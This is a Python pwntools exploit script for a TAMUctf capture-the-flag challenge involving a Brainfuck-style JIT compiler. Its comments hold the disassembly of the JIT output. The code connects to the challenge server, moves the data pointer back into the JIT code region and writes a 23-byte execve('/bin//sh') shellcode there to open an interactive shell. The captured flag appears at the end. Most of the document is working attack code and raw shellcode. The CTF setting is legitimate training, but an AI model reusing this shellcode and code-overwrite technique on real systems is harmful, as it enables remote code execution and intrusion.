from pwn import shellcraft, context, remote, asm
import subprocess

# "." instruction saves registers then calls getchar()
#
#  00004f6c 48 89 7c      MOV       qword ptr [RSP + 0x30], RDI
#           24 30
#  00004f71 48 89 74      MOV       qword ptr [RSP + 0x38], RSI
#           24 38
#  00004f76 48 89 54      MOV       qword ptr [RSP + 0x40], RDX
#           24 40
#  00004f7b 48 89 4c      MOV       qword ptr [RSP + 0x48], RCX
#           24 48
#  00004f80 48 b8 50      MOV       RAX, 0x55b6e0b10b50
#           0b b1 e0
#           b6 55 00
#  00004f8a ff d0         CALL      RAX
#  00004f8c 48 8b 7c      MOV       RDI, qword ptr [RSP + 0x30]
#           24 30
#  00004f91 48 8b 74      MOV       RSI, qword ptr [RSP + 0x38]
#           24 38
#  00004f96 48 8b 54      MOV       RDX, qword ptr [RSP + 0x40]
#           24 40
#  00004f9b 48 8b 4c      MOV       RCX, qword ptr [RSP + 0x48]
#           24 48

#  Some kind of condition check to see if execution continues
#  00004fa0 3c 00         CMP       AL, 0x0
#  00004fa2 0f 85 76      JNZ       LAB_0000501e
#           00 00 00

# ">" instruction incremented rsi, loops back to 0 if rsi exceeds 0x8000
#  00004fa8 48 81 c6      ADD       RSI, 0x1
#           01 00 00
#           00
#  00004faf 48 3b f1      CMP       RSI, RCX
#  00004fb2 0f 82 07      JC        LAB_00004fbf
#           00 00 00
#  00004fb8 48 81 ee      SUB       RSI, 0x8000
#           00 80 00
#           00

context.arch = "amd64"


def bash(cmd):
    return subprocess.check_output(cmd.split(" ")).decode("UTF-8")


r = remote("challenges.tamuctf.com", 31337)

# last block is supposed to indicate if the JIT code ran successfully, then return
SUCCESS_BLOCK_OFFSET = 24  # start of last block distance back from data start

# 23 bytes, shorter than shellcraft.amd64.linux.sh() and there's only 24 bytes free with no shenanigans
pop_shell = "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"

assert len(pop_shell) < SUCCESS_BLOCK_OFFSET
r.sendline("<" * SUCCESS_BLOCK_OFFSET + ",>" * len(pop_shell))

# + "<" * (0x45000) + ".>" * 40000
r.send(pop_shell)
r.sendline()

r.interactive()

# gigem{2_l3J17_2_qU17_0op5_n3veRm1Nd}
